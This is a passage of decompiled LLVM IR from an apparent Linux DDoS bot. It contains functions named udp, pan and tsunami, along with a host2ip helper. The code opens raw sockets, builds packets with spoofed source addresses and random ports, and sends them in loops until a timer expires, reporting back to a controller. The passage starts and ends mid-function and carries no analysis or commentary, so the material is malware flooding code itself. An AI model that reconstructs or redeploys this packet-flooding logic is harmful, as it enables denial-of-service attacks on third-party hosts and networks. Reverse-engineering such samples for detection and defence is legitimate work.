  %stack_var_-16.1 = phi i32 [ %stack_var_-16.0, %dec_label_pc_8049457 ], [ 1, %dec_label_pc_80493c3 ], [ 1, %dec_label_pc_804940b ]
  %stack_var_-20.0 = phi i32 [ %v4_8049457, %dec_label_pc_8049457 ], [ 0, %dec_label_pc_80493c3 ], [ 0, %dec_label_pc_804940b ]
  store i32 %stack_var_-20.0, i32* @edx, align 4
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_8049477 = call i32 @_strlen(i8* %v3_80493d8)
  store i32 %v3_8049477, i32* %eax.global-to-local, align 4
  %v0_804947e = load i32, i32* @edx, align 4
  %v7_804947e = icmp ult i32 %v0_804947e, %v3_8049477
  br i1 %v7_804947e, label %dec_label_pc_8049445, label %dec_label_pc_8049482

dec_label_pc_8049482:                             ; preds = %dec_label_pc_804945a
  %v5_8049487 = sub i32 4, %stack_var_-16.1
  %v15_8049487 = icmp eq i32 %v5_8049487, 0
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_80494d229 = icmp sgt i32 %v5_8049487, 0
  br i1 %v5_80494d229, label %dec_label_pc_8049496, label %dec_label_pc_80494d4

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049482, %dec_label_pc_8049496
  %storemerge230 = phi i32 [ %v4_80494c9, %dec_label_pc_8049496 ], [ 0, %dec_label_pc_8049482 ]
  store i32 %v2_80493cf, i32* @edx, align 4
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_80494b6 = call i32 @_strlen(i8* %v3_80493d8)
  %v0_80494bd = load i32, i32* @edx, align 4
  %v0_80494bd31 = add i32 %v0_80494bd, %v3_80494b6
  store i32 %v0_80494bd31, i32* %eax.global-to-local, align 4
  %v1_80494c0 = inttoptr i32 %v0_80494bd31 to i16*
  store i16 12334, i16* %v1_80494c0, align 2
  %v0_80494c5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494c5 = add i32 %v0_80494c5, 2
  %v2_80494c5 = inttoptr i32 %v1_80494c5 to i8*
  store i8 0, i8* %v2_80494c5, align 1
  %v4_80494c9 = add nuw nsw i32 %storemerge230, 1
  store i32 %v4_80494c9, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_80494c9, %v5_8049487
  br i1 %exitcond, label %dec_label_pc_80494d4, label %dec_label_pc_8049496

dec_label_pc_80494d4:                             ; preds = %dec_label_pc_8049496, %dec_label_pc_8049482
  store i32 %v2_80493cf, i32* @eax, align 4
  %v2_80494dd = call i32 @inet_network(i8* %v3_80493d8)
  store i32 %v2_80494dd, i32* %eax.global-to-local, align 4
  %v1_80494e9 = icmp eq i1 %v15_8049487, false
  br i1 %v1_80494e9, label %dec_label_pc_80494f7, label %dec_label_pc_804950f

dec_label_pc_80494f7:                             ; preds = %dec_label_pc_80494d4
  store i32 %v5_8049487, i32* %eax.global-to-local, align 4
  %v4_8049505 = call i32 @pow(i64 256, i32 %v5_8049487)
  store i32 %v4_8049505, i32* %eax.global-to-local, align 4
  %v1_804950a = sext i32 %v4_8049505 to i64
  br label %dec_label_pc_804950f

dec_label_pc_804950f:                             ; preds = %dec_label_pc_80494d4, %dec_label_pc_80494f7
  %storemerge = phi i64 [ %v1_804950a, %dec_label_pc_80494f7 ], [ 1, %dec_label_pc_80494d4 ]
  store i64 %storemerge, i64* @global_var_8062e2c.33, align 8
  store i32 %v2_80494dd, i32* %eax.global-to-local, align 4
  %v1_8049512 = inttoptr i32 %v2_80494dd to i8*
  store i8* %v1_8049512, i8** @global_var_8062e28.32, align 8
  br label %dec_label_pc_8049517

dec_label_pc_8049517:                             ; preds = %dec_label_pc_80493a4, %dec_label_pc_8049349, %dec_label_pc_804950f
  %v0_804951f = phi i32 [ %v3_80493b9, %dec_label_pc_80493a4 ], [ %v3_804935e, %dec_label_pc_8049349 ], [ %v2_80494dd, %dec_label_pc_804950f ]
  ret i32 %v0_804951f

; uselistorder directives
  uselistorder i32 %v2_80494dd, { 0, 2, 1, 3 }
  uselistorder i32 %v4_80494c9, { 1, 2, 0 }
  uselistorder i32 %v5_8049487, { 3, 2, 0, 1, 4 }
  uselistorder i32 %stack_var_-20.0, { 3, 2, 0, 1 }
  uselistorder i32 %v2_80493ee, { 1, 2, 0, 3 }
  uselistorder i8* %v3_80493d8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_80493cf, { 1, 0, 2 }
  uselistorder i32 %v1_804939e, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 3, 2, 6, 8, 4, 5, 7, 0, 11, 12, 9, 10, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 25, 24 }
  uselistorder i32 (i64, i32)* @pow, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049517, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804950f, { 1, 0 }
  uselistorder label %dec_label_pc_8049496, { 1, 0 }
  uselistorder label %dec_label_pc_804945a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049457, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049520 = load i32, i32* @ebp, align 4
  store i32 %v0_8049520, i32* %stack_var_-4, align 4
  %v4_8049520 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049520, i32* @ebp, align 4
  %v1_804952c = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_804952c, i32* @global_var_8063240.68, align 64
  %v10_804953b = icmp eq i32 %v1_804952c, -1
  %v1_804953e = icmp eq i1 %v10_804953b, false
  br i1 %v1_804953e, label %dec_label_pc_80495a8, label %dec_label_pc_8049540

dec_label_pc_8049540:                             ; preds = %entry
  %v1_8049546 = call i32 @__GI_gethostbyname(i32 %arg2)
  %v4_804954e = icmp eq i32 %v1_8049546, 0
  %v1_8049552 = icmp eq i1 %v4_804954e, false
  br i1 %v1_8049552, label %dec_label_pc_8049583, label %dec_label_pc_8049554

dec_label_pc_8049554:                             ; preds = %dec_label_pc_8049540
  %v0_8049554 = load i32, i32* @global_var_80678c8.28, align 8
  %v2_8049572 = call i32 @Send(i32 %v0_8049554, i32 ptrtoint ([33 x i8]* @global_var_805ab98.69 to i32))
  %v1_804957e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8049583

dec_label_pc_8049583:                             ; preds = %dec_label_pc_8049540, %dec_label_pc_8049554
  %v1_8049586 = add i32 %v1_8049546, 12
  %v2_8049586 = inttoptr i32 %v1_8049586 to i32*
  %v3_8049586 = load i32, i32* %v2_8049586, align 4
  %v1_8049593 = add i32 %v1_8049546, 16
  %v2_8049593 = inttoptr i32 %v1_8049593 to i32*
  %v3_8049593 = load i32, i32* %v2_8049593, align 4
  %v1_8049596 = inttoptr i32 %v3_8049593 to i32*
  %v2_8049596 = load i32, i32* %v1_8049596, align 4
  %v3_80495a3 = call i32 @bcopy(i32 %v2_8049596, i32 ptrtoint (i32* @global_var_8063240.68 to i32), i32 %v3_8049586)
  %v0_80495a8.pre = load i32, i32* @global_var_8063240.68, align 64
  br label %dec_label_pc_80495a8

dec_label_pc_80495a8:                             ; preds = %entry, %dec_label_pc_8049583
  %v0_80495a8 = phi i32 [ %v1_804952c, %entry ], [ %v0_80495a8.pre, %dec_label_pc_8049583 ]
  %v2_80495ad = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495ad, i32* @ebp, align 4
  ret i32 %v0_80495a8

; uselistorder directives
  uselistorder i32 %v1_804952c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80495a8, { 1, 0 }
  uselistorder label %dec_label_pc_8049583, { 1, 0 }
}

define i32 @udp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-1540 = alloca i32, align 4
  %stack_var_-1560 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80495af = load i32, i32* @ebp, align 4
  store i32 %v0_80495af, i32* %stack_var_-4, align 4
  %v4_80495af = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495af, i32* @ebp, align 4
  %v2_80495c6 = call i32 @__GI_time(i32* null)
  %v1_80495d4 = call i32 @mfork(i32 %arg2)
  %v1_80495d9 = icmp eq i32 %v1_80495d4, 0
  %v1_80495db = icmp eq i1 %v1_80495d9, false
  br i1 %v1_80495db, label %dec_label_pc_804985d, label %dec_label_pc_80495e1

dec_label_pc_80495e1:                             ; preds = %entry
  %v4_80495f8 = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_8049600 = icmp slt i32 %v4_80495f8, 0
  %v1_8049604 = icmp eq i1 %v5_8049600, false
  br i1 %v1_8049604, label %dec_label_pc_8049612, label %dec_label_pc_8049606

dec_label_pc_8049606:                             ; preds = %dec_label_pc_80495e1
  %v1_804960d = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8049612

dec_label_pc_8049612:                             ; preds = %dec_label_pc_80495e1, %dec_label_pc_8049606
  %v4_8049612 = add i32 %arg3, -2
  %v9_8049612 = sub i32 1, %arg3
  %v10_8049612 = and i32 %v9_8049612, %arg3
  %v11_8049612 = icmp slt i32 %v10_8049612, 0
  %v12_8049612 = icmp eq i32 %v4_8049612, 0
  %v13_8049612 = icmp slt i32 %v4_8049612, 0
  %v3_8049616 = icmp eq i1 %v13_8049612, %v11_8049612
  %v4_8049616 = icmp eq i1 %v12_8049612, false
  %v5_8049616 = and i1 %v4_8049616, %v3_8049616
  br i1 %v5_8049616, label %dec_label_pc_804963e, label %dec_label_pc_8049618

dec_label_pc_8049618:                             ; preds = %dec_label_pc_8049612
  %v3_804962d = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_805abbc.70 to i32))
  %v1_8049639 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804963e

dec_label_pc_804963e:                             ; preds = %dec_label_pc_8049612, %dec_label_pc_8049618
  %v1_8049641 = add i32 %arg4, 4
  %v1_8049644 = inttoptr i32 %v1_8049641 to i32*
  %v2_8049644 = load i32, i32* %v1_8049644, align 4
  %v3_8049650 = call i32 @host2ip(i32 %arg2, i32 %v2_8049644)
  %v1_804965b = add i32 %arg4, 8
  %v1_804965e = inttoptr i32 %v1_804965b to i32*
  %v2_804965e = load i32, i32* %v1_804965e, align 4
  %v1_8049663 = call i32 @atol(i32 %v2_804965e)
  %v1_804966e = add i32 %arg4, 12
  %v1_8049671 = inttoptr i32 %v1_804966e to i32*
  %v2_8049671 = load i32, i32* %v1_8049671, align 4
  %v1_8049676 = call i32 @atol(i32 %v2_8049671)
  %v2_804967e = ptrtoint i32* %stack_var_-1560 to i32
  %tmp33 = bitcast i32* %stack_var_-1540 to i16*
  %v4_80496b5 = bitcast i32* %stack_var_-1532 to i8*
  %v5_80496b5 = call i32 @__GI_memset(i8* %v4_80496b5, i32 10, i32 1472)
  %v3_80496db = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_805abe3.71 to i32))
  %v3_80496ea = bitcast i32* %stack_var_-1560 to i8*
  store i8 69, i8* %v3_80496ea, align 4
  %v1_80496fb = or i32 %v2_804967e, 1
  %v2_80496fb = inttoptr i32 %v1_80496fb to i8*
  store i8 0, i8* %v2_80496fb, align 1
  %v1_8049702 = or i32 %v2_804967e, 2
  %v2_8049702 = inttoptr i32 %v1_8049702 to i16*
  store i16 1500, i16* %v2_8049702, align 2
  %v1_804970b = add i32 %v2_804967e, 6
  %v2_804970b = inttoptr i32 %v1_804970b to i16*
  store i16 0, i16* %v2_804970b, align 2
  %v1_8049714 = add i32 %v2_804967e, 9
  %v2_8049714 = inttoptr i32 %v1_8049714 to i8*
  store i8 17, i8* %v2_8049714, align 1
  %v1_804971b = add i32 %v2_804967e, 8
  %v2_804971b = inttoptr i32 %v1_804971b to i8*
  store i8 64, i8* %v2_804971b, align 4
  %v2_8049725 = add i32 %v2_804967e, 16
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v3_8049650, i32* %v3_8049725, align 4
  %v1_8049731 = trunc i32 %tmp9 to i16
  %v2_8049731 = call i32 @htons(i16 %v1_8049731)
  %v4_8049739 = ptrtoint i32* %stack_var_-1540 to i32
  %v1_804973c = trunc i32 %v2_8049731 to i16
  %v3_804973c = add i32 %v4_8049739, 4
  %v4_804973c = inttoptr i32 %v3_804973c to i16*
  store i16 %v1_804973c, i16* %v4_804973c, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v4_804975a = icmp eq i32 %v1_8049663, 0
  %v3_8049785 = or i32 %v4_8049739, 2
  %v4_8049785 = inttoptr i32 %v3_8049785 to i16*
  %v3_804979a = bitcast i32* %stack_var_-1560 to i16*
  %v3_80497a5 = add i32 %v4_8049739, 6
  %v4_80497a5 = inttoptr i32 %v3_80497a5 to i16*
  %v2_80497b3 = add i32 %v2_804967e, 12
  %v3_80497b3 = inttoptr i32 %v2_80497b3 to i32*
  %v3_80497c1 = add i32 %v2_804967e, 4
  %v4_80497c1 = inttoptr i32 %v3_80497c1 to i16*
  %v3_80497e1 = add i32 %v2_804967e, 10
  %v4_80497e1 = inttoptr i32 %v3_80497e1 to i16*
  %v2_80497f0 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804983b = add i32 %v1_8049676, %v2_80495c6
  %v1_8049769 = trunc i32 %v1_8049663 to i16
  br label %dec_label_pc_804974c

dec_label_pc_804974c:                             ; preds = %dec_label_pc_8049855, %dec_label_pc_804963e
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_804963e ], [ %v4_8049855, %dec_label_pc_8049855 ]
  %v0_804974c = call i32 @random()
  %v1_8049757 = trunc i32 %v0_804974c to i16
  store i16 %v1_8049757, i16* %tmp33, align 4
  br i1 %v4_804975a, label %dec_label_pc_804977a, label %dec_label_pc_8049760

dec_label_pc_8049760:                             ; preds = %dec_label_pc_804974c
  %v2_8049769 = call i32 @htons(i16 %v1_8049769)
  br label %dec_label_pc_8049789

dec_label_pc_804977a:                             ; preds = %dec_label_pc_804974c
  %v0_804977a = call i32 @random()
  br label %dec_label_pc_8049789

dec_label_pc_8049789:                             ; preds = %dec_label_pc_8049760, %dec_label_pc_804977a
  %storemerge4.in = phi i32 [ %v2_8049769, %dec_label_pc_8049760 ], [ %v0_804977a, %dec_label_pc_804977a ]
  %storemerge = trunc i32 %storemerge4.in to i16
  store i16 %storemerge, i16* %v4_8049785, align 2
  %v4_804979a = call i32 @in_cksum(i16* %v3_804979a, i32 1500)
  %v1_80497a5 = trunc i32 %v4_804979a to i16
  store i16 %v1_80497a5, i16* %v4_80497a5, align 2
  %v0_80497a9 = call i32 @getspoof()
  store i32 %v0_80497a9, i32* %v3_80497b3, align 4
  %v0_80497b6 = call i32 @random()
  %v1_80497c1 = trunc i32 %v0_80497b6 to i16
  store i16 %v1_80497c1, i16* %v4_80497c1, align 4
  %v4_80497d6 = call i32 @in_cksum(i16* %v3_804979a, i32 1500)
  %v1_80497e1 = trunc i32 %v4_80497d6 to i16
  store i16 %v1_80497e1, i16* %v4_80497e1, align 2
  %v7_804981f = call i32 @sendto(i32 %v4_80495f8, i32 %v2_804967e, i32 1500, i32 0, i32 %v2_80497f0, i32 16)
  %tmp = icmp ult i32 %stack_var_-40.0, 50
  br i1 %tmp, label %dec_label_pc_8049855, label %dec_label_pc_804982a

dec_label_pc_804982a:                             ; preds = %dec_label_pc_8049789
  %v2_8049831 = call i32 @__GI_time(i32* null)
  %v7_804983e = icmp ult i32 %v2_8049831, %v5_804983b
  br i1 %v7_804983e, label %dec_label_pc_8049855, label %dec_label_pc_8049842

dec_label_pc_8049842:                             ; preds = %dec_label_pc_804982a
  %v1_8049849 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8049855

dec_label_pc_8049855:                             ; preds = %dec_label_pc_8049842, %dec_label_pc_804982a, %dec_label_pc_8049789
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0, %dec_label_pc_8049789 ], [ 0, %dec_label_pc_804982a ], [ 0, %dec_label_pc_8049842 ]
  %v4_8049855 = add i32 %stack_var_-40.1, 1
  br label %dec_label_pc_804974c

dec_label_pc_804985d:                             ; preds = %entry
  ret i32 %v1_80495d4

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v2_804967e, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %v4_8049612, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1560, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049789, { 1, 0 }
  uselistorder label %dec_label_pc_804963e, { 1, 0 }
  uselistorder label %dec_label_pc_8049612, { 1, 0 }
}

define i32 @pan(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-104 = alloca i8, align 1
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804985f = load i32, i32* @ebp, align 4
  store i32 %v0_804985f, i32* %stack_var_-4, align 4
  %v4_804985f = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804985f, i32* @ebp, align 4
  %v3_8049883 = bitcast i32* %stack_var_-252 to i16*
  %v4_8049883 = call i32 @memcpy(i16* %v3_8049883, i32 ptrtoint (i32* @global_var_805ac00.72 to i32), i32 80)
  %v2_804989d = call i32 @__GI_time(i32* null)
  %v1_80498ab = call i32 @mfork(i32 %arg2)
  %v1_80498b0 = icmp eq i32 %v1_80498ab, 0
  %v1_80498b2 = icmp eq i1 %v1_80498b0, false
  br i1 %v1_80498b2, label %dec_label_pc_8049c56, label %dec_label_pc_80498b8

dec_label_pc_80498b8:                             ; preds = %entry
  %v4_80498b8 = add i32 %arg3, -2
  %v9_80498b8 = sub i32 1, %arg3
  %v10_80498b8 = and i32 %v9_80498b8, %arg3
  %v11_80498b8 = icmp slt i32 %v10_80498b8, 0
  %v12_80498b8 = icmp eq i32 %v4_80498b8, 0
  %v13_80498b8 = icmp slt i32 %v4_80498b8, 0
  %v3_80498bc = icmp eq i1 %v13_80498b8, %v11_80498b8
  %v4_80498bc = icmp eq i1 %v12_80498b8, false
  %v5_80498bc = and i1 %v4_80498bc, %v3_80498bc
  br i1 %v5_80498bc, label %dec_label_pc_80498e4, label %dec_label_pc_80498be

dec_label_pc_80498be:                             ; preds = %dec_label_pc_80498b8
  %v2_80498d3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_805ac50.73 to i32))
  %v1_80498df = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_80498e4

dec_label_pc_80498e4:                             ; preds = %dec_label_pc_80498b8, %dec_label_pc_80498be
  %v3_80498fb = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_8049903 = icmp slt i32 %v3_80498fb, 0
  %v1_8049907 = icmp eq i1 %v5_8049903, false
  br i1 %v1_8049907, label %dec_label_pc_8049932.preheader, label %dec_label_pc_8049909

dec_label_pc_8049909:                             ; preds = %dec_label_pc_80498e4
  %v1_8049910 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8049932.preheader

dec_label_pc_8049932.preheader:                   ; preds = %dec_label_pc_80498e4, %dec_label_pc_8049909
  br label %dec_label_pc_804991e

dec_label_pc_804991e:                             ; preds = %dec_label_pc_8049932.preheader, %dec_label_pc_804991e
  %storemerge69 = phi i32 [ 0, %dec_label_pc_8049932.preheader ], [ %v4_804992f, %dec_label_pc_804991e ]
  store i32 %storemerge69, i32* @edx, align 4
  %v0_8049924 = load i32, i32* @ebp, align 4
  %v2_8049924 = mul nuw nsw i32 %storemerge69, 4
  %v3_8049924 = add nuw nsw i32 %v2_8049924, -248
  %v4_8049924 = add i32 %v3_8049924, %v0_8049924
  %v5_8049924 = inttoptr i32 %v4_8049924 to i32*
  %v6_8049924 = load i32, i32* %v5_8049924, align 4
  %v1_804992b = trunc i32 %v6_8049924 to i8
  %v4_804992b = add nuw nsw i32 %storemerge69, -60
  %v5_804992b = add i32 %v4_804992b, %v0_8049924
  %v6_804992b = inttoptr i32 %v5_804992b to i8*
  store i8 %v1_804992b, i8* %v6_804992b, align 1
  %v4_804992f = add nuw nsw i32 %storemerge69, 1
  %exitcond = icmp eq i32 %v4_804992f, 20
  br i1 %exitcond, label %dec_label_pc_8049938, label %dec_label_pc_804991e

dec_label_pc_8049938:                             ; preds = %dec_label_pc_804991e
  %v1_804993b = add i32 %arg4, 4
  %v1_804993e = inttoptr i32 %v1_804993b to i32*
  %v2_804993e = load i32, i32* %v1_804993e, align 4
  %v2_804994a = call i32 @host2ip(i32 %arg2, i32 %v2_804993e)
  %v1_8049955 = add i32 %arg4, 12
  %v1_8049958 = inttoptr i32 %v1_8049955 to i32*
  %v2_8049958 = load i32, i32* %v1_8049958, align 4
  %v1_804995d = call i32 @atol(i32 %v2_8049958)
  %v2_8049986 = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_805ac77.74 to i32))
  store i8 69, i8* %stack_var_-104, align 1
  %v1_8049a25 = add i32 %arg4, 8
  %v1_8049a28 = inttoptr i32 %v1_8049a25 to i32*
  %v2_8049a28 = load i32, i32* %v1_8049a28, align 4
  %v1_8049a2d = call i32 @atol(i32 %v2_8049a28)
  %v1_8049a38 = trunc i32 %v1_8049a2d to i16
  %v2_8049a38 = call i32 @htons(i16 %v1_8049a38)
  %v2_8049ae9 = ptrtoint i8* %stack_var_-104 to i32
  %v2_8049af7 = bitcast i8* %stack_var_-104 to i16*
  %v2_8049b89 = ptrtoint i32* %stack_var_-144 to i32
  %v15_8049b8f = ptrtoint i32* %stack_var_-84 to i32
  %v12_8049bb3 = ptrtoint i32* %stack_var_-124 to i32
  %v15_8049bbd = ptrtoint i32* %stack_var_-64 to i32
  %v2_8049bdb = bitcast i32* %stack_var_-156 to i16*
  %v2_8049be7 = ptrtoint i32* %stack_var_-172 to i32
  %v5_8049c34 = add i32 %v1_804995d, %v2_804989d
  br label %dec_label_pc_8049a43

dec_label_pc_8049a43:                             ; preds = %dec_label_pc_8049c4e, %dec_label_pc_8049938
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_8049938 ], [ %v4_8049c4e, %dec_label_pc_8049c4e ]
  %v0_8049a43 = call i32 @random()
  %v2_8049a51 = load i32, i32* %v1_8049a28, align 4
  %v1_8049a56 = call i32 @atol(i32 %v2_8049a51)
  %v1_8049a5b = icmp eq i32 %v1_8049a56, 0
  %v1_8049a5d = icmp eq i1 %v1_8049a5b, false
  br i1 %v1_8049a5d, label %dec_label_pc_8049a67, label %dec_label_pc_8049a5f

dec_label_pc_8049a5f:                             ; preds = %dec_label_pc_8049a43
  %v0_8049a5f = call i32 @random()
  br label %dec_label_pc_8049a67

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049a43, %dec_label_pc_8049a5f
  %v0_8049a67 = call i32 @getspoof()
  %v2_8049a7e = call i32 @htons(i16 60)
  %v1_8049a8a = call i32 @random()
  %v1_8049aab = urem i32 %v0_8049a43, 65536
  store i32 %v1_8049aab, i32* %stack_var_-84, align 4
  %v1_8049abc = call i32 @random()
  store i32 2, i32* %stack_var_-172, align 4
  %v3_8049af7 = call i32 @in_cksum(i16* %v2_8049af7, i32 20)
  %v1_8049b03 = call i32 @random()
  store i32 %v0_8049a67, i32* %stack_var_-156, align 4
  %v2_8049b74 = call i32 @htons(i16 40)
  %v3_8049ba1 = call i32 @bcopy(i32 %v15_8049b8f, i32 %v2_8049b89, i32 20)
  %v3_8049bc3 = call i32 @bcopy(i32 %v15_8049bbd, i32 %v12_8049bb3, i32 20)
  %v3_8049bdb = call i32 @in_cksum(i16* %v2_8049bdb, i32 52)
  %v6_8049c18 = call i32 @sendto(i32 %v3_80498fb, i32 %v2_8049ae9, i32 60, i32 0, i32 %v2_8049be7, i32 16)
  %tmp = icmp ult i32 %stack_var_-44.0, 50
  br i1 %tmp, label %dec_label_pc_8049c4e, label %dec_label_pc_8049c23

dec_label_pc_8049c23:                             ; preds = %dec_label_pc_8049a67
  %v2_8049c2a = call i32 @__GI_time(i32* null)
  %v7_8049c37 = icmp ult i32 %v2_8049c2a, %v5_8049c34
  br i1 %v7_8049c37, label %dec_label_pc_8049c4e, label %dec_label_pc_8049c3b

dec_label_pc_8049c3b:                             ; preds = %dec_label_pc_8049c23
  %v1_8049c42 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8049c4e

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049c3b, %dec_label_pc_8049c23, %dec_label_pc_8049a67
  %stack_var_-44.1 = phi i32 [ %stack_var_-44.0, %dec_label_pc_8049a67 ], [ 0, %dec_label_pc_8049c23 ], [ 0, %dec_label_pc_8049c3b ]
  %v4_8049c4e = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_8049a43

dec_label_pc_8049c56:                             ; preds = %entry
  ret i32 %v1_80498ab

; uselistorder directives
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32 %storemerge69, { 2, 3, 0, 1 }
  uselistorder i32 %v4_80498b8, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049a67, { 1, 0 }
  uselistorder label %dec_label_pc_804991e, { 1, 0 }
  uselistorder label %dec_label_pc_8049932.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80498e4, { 1, 0 }
}

define i32 @tsunami(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-204 = alloca i32, align 4
  store i32 0, i32* %stack_var_-204, align 4
  %v2_8049c70 = call i32 @__GI_time(i32* null)
  store i32 %arg2, i32* %stack_var_-204, align 4
  %v1_8049c7e = call i32 @mfork(i32 %arg2)
  %v1_8049c83 = icmp eq i32 %v1_8049c7e, 0
  %v1_8049c85 = icmp eq i1 %v1_8049c83, false
  br i1 %v1_8049c85, label %dec_label_pc_8049fe3, label %dec_label_pc_8049c8b

dec_label_pc_8049c8b:                             ; preds = %entry
  %v4_8049c8b = add i32 %arg3, -1
  %v9_8049c8b = sub i32 0, %arg3
  %v10_8049c8b = and i32 %arg3, %v9_8049c8b
  %v11_8049c8b = icmp slt i32 %v10_8049c8b, 0
  %v12_8049c8b = icmp eq i32 %v4_8049c8b, 0
  %v13_8049c8b = icmp slt i32 %v4_8049c8b, 0
  %v3_8049c8f = icmp eq i1 %v13_8049c8b, %v11_8049c8b
  %v4_8049c8f = icmp eq i1 %v12_8049c8b, false
  %v5_8049c8f = and i1 %v4_8049c8f, %v3_8049c8f
  br i1 %v5_8049c8f, label %dec_label_pc_8049cb7, label %dec_label_pc_8049c91

dec_label_pc_8049c91:                             ; preds = %dec_label_pc_8049c8b
  store i32 %arg1, i32* %stack_var_-204, align 4
  %v3_8049ca6 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_805ac90.75 to i32))
  store i32 1, i32* %stack_var_-204, align 4
  %v1_8049cb2 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8049cb7

dec_label_pc_8049cb7:                             ; preds = %dec_label_pc_8049c8b, %dec_label_pc_8049c91
  %v1_8049cba = add i32 %arg4, 8
  %v1_8049cbd = inttoptr i32 %v1_8049cba to i32*
  %v2_8049cbd = load i32, i32* %v1_8049cbd, align 4
  store i32 %v2_8049cbd, i32* %stack_var_-204, align 4
  %v1_8049cc2 = call i32 @atol(i32 %v2_8049cbd)
  store i32 2, i32* %stack_var_-204, align 4
  %v4_8049ce1 = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_8049ce9 = icmp slt i32 %v4_8049ce1, 0
  %v1_8049ced = icmp eq i1 %v5_8049ce9, false
  br i1 %v1_8049ced, label %dec_label_pc_8049cfb, label %dec_label_pc_8049cef

dec_label_pc_8049cef:                             ; preds = %dec_label_pc_8049cb7
  store i32 1, i32* %stack_var_-204, align 4
  %v1_8049cf6 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8049cfb

dec_label_pc_8049cfb:                             ; preds = %dec_label_pc_8049cb7, %dec_label_pc_8049cef
  store i32 0, i32* %stack_var_-204, align 4
  %v2_8049d02 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049d02, i32* @ebx, align 4
  %v0_8049d09 = load i32, i32* %stack_var_-204, align 4
  %v1_8049d09 = call i32 @__libc_getpid(i32 %v0_8049d09)
  %v1_8049d0e = load i32, i32* @ebx, align 4
